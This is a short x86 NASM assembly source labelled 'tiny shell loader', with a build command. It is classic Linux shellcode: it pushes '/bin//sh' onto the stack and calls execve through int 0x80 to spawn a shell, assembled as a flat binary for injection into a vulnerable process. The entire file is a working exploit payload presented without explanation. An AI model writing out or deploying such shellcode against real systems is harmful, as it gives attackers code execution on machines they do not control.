;tiny shell loader by thc_flow
;nasm -fbin -O0 shell.s
[BITS 32]
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	mov edx,esp
	push ebx
	mov ecx,esp
	mov al,11
	int 0x80
